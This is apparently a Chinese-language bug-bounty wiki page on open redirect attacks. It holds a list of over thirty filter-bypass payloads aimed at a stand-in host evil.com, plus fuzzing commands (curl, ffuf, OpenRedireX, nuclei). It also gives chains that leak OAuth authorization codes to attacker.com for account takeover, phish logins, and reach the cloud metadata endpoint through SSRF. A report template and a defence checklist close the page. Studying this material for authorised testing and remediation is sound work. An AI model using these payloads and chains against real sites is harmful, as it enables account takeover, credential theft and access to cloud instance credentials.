---
type: wiki
category: attack
tool: openredirex,burp,manual
status: active
last-updated: 2026-04-21
---

# Open Redirect 30+ Bypass + 攻擊鏈（2026 版）

> **用途：** Open redirect 單獨常被 N/A / P5，但鏈到 OAuth redirect_uri / phishing / SSRF / XSS 就變 P1-P2。本文把所有 bypass 列全，並展示怎麼串鏈拉高嚴重度。

## 0. 2026 現況

| 情境 | Bounty |
|------|--------|
| Open redirect 單獨（no phishing context） | P5 / N/A |
| Open redirect → OAuth authorization code 外流 | P2-P1 |
| Open redirect on login → credential phishing | P3-P2 |
| Open redirect → XSS (javascript: scheme) | P3 |
| Header-based redirect → cache poisoning | P3 |

關鍵：**不要單獨送 open redirect，除非 scope 明說接受**。

## 1. 找 redirect sink

### 1.1 參數名清單

```
redirect   redirect_uri   redirectUrl   return   returnUrl   returnTo
next       forward        callback      url       u   target
goto       dest           destination   continue
success_url   failure_url   back   r   link
```

### 1.2 流程線索

```
Login 成功後跳轉：?next=/dashboard
Logout：?return=/
OAuth：?redirect_uri=...
Password reset：email link 中的 domain
Email confirmation：link 的 landing
Form POST → 302 Location
```

## 2. 30+ Bypass 技巧

### 2.1 基本（未防禦）

```
?url=https://evil.com/
?url=//evil.com/          # protocol-relative
?url=\\evil.com/          # backslash（browser 當 /）
```

### 2.2 白單「必須是本 domain」

```
?url=https://evil.com@target.com/          # @ 之前是 userinfo
?url=https://target.com.evil.com/          # subdomain 混淆
?url=https://target.com@evil.com/          # 反過來
?url=https://evil.com/?target.com          # target.com 當 query
?url=https://evil.com/target.com           # target.com 當 path
?url=https://evil.com#target.com           # # 之後
?url=https://target.com.evil.com@evil.com/ # 多層
```

### 2.3 白單「開頭必須是 https://target.com」

```
?url=https://target.com.evil.com/          # 前綴符合
?url=https:target.com@evil.com/            # 注意 // 省略
?url=https://target.com%00.evil.com/       # null byte
?url=https://target.com%0d.evil.com/       # CR
?url=https://target.com%2eevil.com/        # . encoded
?url=https://target.com%09.evil.com/       # tab
```

### 2.4 白單「只能包含 target.com」

```
?url=https://evil.com/.target.com
?url=https://evil.com#target.com
?url=https://evil.com?.target.com
?url=http://evil.com/?.target.com=
```

### 2.5 Scheme bypass

```
?url=javascript:alert(1)
?url=javascript://target.com/%0aalert(1)  # 同 scheme 繞 scheme check
?url=data:text/html,<script>...</script>
?url=vbscript:msgbox(1)                    # IE legacy
?url=file:///etc/passwd                    # 一些 native app
```

### 2.6 Encoding

```
?url=https://evil.com%2F@target.com        # / → %2F
?url=https%3A%2F%2Fevil.com                # 全 encode
?url=https%253A%252F%252Fevil.com          # double encode
?url=https://%65vil.com                    # %65 = e
```

### 2.7 IDN / Unicode homograph

```
?url=https://ẹxample.com/                  # 類似 e 的 dot-below
?url=https://раураl.com/                    # cyrillic p = latin p 看起來
# 2026 瀏覽器多數顯示 punycode，但 email client 不一定
```

### 2.8 Protocol confusion

```
?url=//evil.com/                # 會繼承當前 scheme
?url=\/\/evil.com/              # browser decode 成 //
?url=/\/evil.com/               # 同上
?url=//%0A/evil.com/            # CR + //
```

### 2.9 Fragment tricks

```
?url=https://target.com#@evil.com/
?url=https://target.com#.evil.com/
# 有些 server-side regex 檢查 # 前段，但 browser 遵循完整 URL
```

### 2.10 CRLF injection 配合

```
?url=/%0d%0aLocation:%20https://evil.com
# 詳見 [70-host-header-crlf.md]
```

### 2.11 Reverse proxy parser difference

```
?url=https://target.com
       .evil.com/    # 有 line break（尾端 ...）
# 某些 parser 只取第一行
```

## 3. URL parser 不一致實驗

Browser vs server URL parser 常有差異。用 Orange Tsai's [A New Era of SSRF] 研究：

```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
   ↑
Python urllib: host=2.2.2.2
Go net/url:    host=1.1.1.1
Java:          host=1.1.1.1
libcurl:       host=3.3.3.3

→ WAF 解析 2.2.2.2（白單），後端 fetch 3.3.3.3（攻擊者）
```

測多個 parser：[https://polyglot-xss.com/](這類差異測試) 或看研究 PoC。

## 4. 攻擊鏈

### 4.1 OAuth code 竊取（高獎金）

```
# 正常 flow
https://provider.com/oauth?client=x&redirect_uri=https://target.com/callback

# Attack（若 target.com 有 open redirect）
1. 改 redirect_uri=https://target.com/redirect?url=https://evil.com
2. User 授權 → provider 302 到 target.com/redirect?url=https://evil.com
3. target.com 又 302 到 evil.com?code=AUTHCODE
4. Attacker 拿到 code → 換 access_token → ATO

# 或 OAuth redirect_uri 本身做 substring check bypass
redirect_uri=https://target.com.evil.com/   # 繞 startswith("target.com")
```

詳見 [16-oauth-attack-chains.md](16-oauth-attack-chains.md)。

### 4.2 Login credential phishing

```
https://target.com/login?return=/admin
→ 登入後跳 /admin

# Attack
https://target.com/login?return=https://target-login.evil.com/
→ 使用者登入失敗（被 reset）→ Attacker site 偽裝 "Session expired, login again"
→ victim 輸密碼給 attacker
```

### 4.3 CORS / CSP bypass

若 app 的 reflective CORS 只信 target.com，open redirect 到 evil.com 後 evil.com 透過 attacker-controlled 頁面拿 API → 看似 `same-origin`（from victim perspective）。

### 4.4 SSRF mini

若 server 跟隨 redirect：

```
?url=https://attacker.com/
attacker.com 302 → http://169.254.169.254/
→ server 跟隨 → SSRF to IMDS
```

詳見 [66-ssrf-deep.md](66-ssrf-deep.md) §3.1。

### 4.5 XSS via javascript:

```
?url=javascript:alert(1)
# 若 redirect 用 window.location.href = input → 直接執行 JS
```

### 4.6 Cache poisoning → Persistent redirect

Reflected redirect + unkeyed header → 下個 user 被重導。

見 [64-cache-poisoning.md](64-cache-poisoning.md)。

## 5. 偵測

### 5.1 手動

```bash
# 在 redirect-like 參數塞 evil.com
for p in redirect redirect_uri returnUrl next url callback; do
  curl -Iks "https://target.com/?$p=https://evil.com" | grep -i location
done
```

### 5.2 ffuf

```bash
ffuf -u 'https://target.com/?redirect=FUZZ' \
  -w open-redirect-payloads.txt \
  -mr "Location:.*evil\.com"
```

### 5.3 OpenRedireX

```bash
git clone https://github.com/devanshbatham/OpenRedireX
cat urls.txt | python3 openredirex.py -p /path/to/payloads.txt
```

### 5.4 Gau + gf + ffuf 鏈

```bash
gau https://target.com | gf redirect | \
  ffuf -u '{URL}' -w payloads.txt -mr 'Location:'
```

### 5.5 Nuclei

```bash
nuclei -u https://target.com -tags redirect
```

## 6. 完整 PoC：OAuth state + redirect_uri bypass → ATO

### Step 1: 找 OAuth provider

```
target.com 用 Google Sign-in
https://accounts.google.com/o/oauth2/auth?
  client_id=APP_ID&
  redirect_uri=https://target.com/auth/google/callback&
  response_type=code&state=xxx
```

### Step 2: 驗證 redirect_uri 驗證方式

```bash
# 試 subdomain
https://target.com.attacker.com/
https://target.com@attacker.com/
https://target.com/%2e%2e/.attacker.com
```

### Step 3: 若 app 上傳 + path-open-redirect

```
target.com 的 /redirect?url= 有 open redirect
→ redirect_uri=https://target.com/redirect?url=https://attacker.com
→ Google 信任 target.com prefix
→ user 授權後 code 被帶到 attacker.com
```

### Step 4: 取 code → 換 token → 進 victim 帳號

### Step 5: 報告

```markdown
## 漏洞概述
https://target.com/redirect?url= 未白單 url 參數，允許 redirect 到任意
domain。配合 OAuth `redirect_uri` 用 startswith 驗證，可構造
`redirect_uri=https://target.com/redirect?url=https://attacker.com`，
繞過驗證使 OAuth authorization code 被送到 attacker server，達成
完整帳號接管。

## PoC
[OAuth authorize URL + attacker 捕獲 code + token exchange]

## Impact
- 任意 Google 登入使用者 ATO（攻擊者獲得 access_token）
- 不需目標 victim credentials

## Severity
P1 / Critical

## 修補
1. /redirect endpoint 白單 url 參數（同 domain only）
2. OAuth redirect_uri 改為 exact match（非 startswith / contains）
3. 若必須動態 redirect_uri，用白單陣列完整比對
```

## 7. 防禦 checklist

```
1. Redirect 目的地用白單 exact match（非 startswith / contains）
2. 若必須動態，用 ID map：{1:'/home',2:'/admin'}，user 只傳 ID
3. 禁用 javascript: / data: / file: scheme
4. URL parser 統一（server + WAF 用同一個 library）
5. 用 framework 內建 safe redirect API（Django `redirect()` 自動檢查，Rails `redirect_to`）
6. OAuth redirect_uri strict exact match + registered list
7. 顯示「即將離開 target.com」中介頁（UX 擋 phishing）
8. 避免 302，用 meta refresh + CSP lock
```

## 關聯文件

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth redirect_uri bypass 完整 12 招
- [64-cache-poisoning.md](64-cache-poisoning.md) — Redirect 配 cache
- [66-ssrf-deep.md](66-ssrf-deep.md) — URL parser 差異 + SSRF
- [70-host-header-crlf.md](70-host-header-crlf.md) — CRLF + Location
- PortSwigger DOM-based open redirection：https://portswigger.net/web-security/dom-based/open-redirection
- PayloadsAllTheThings Open Redirect：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- OpenRedireX：https://github.com/devanshbatham/OpenRedireX
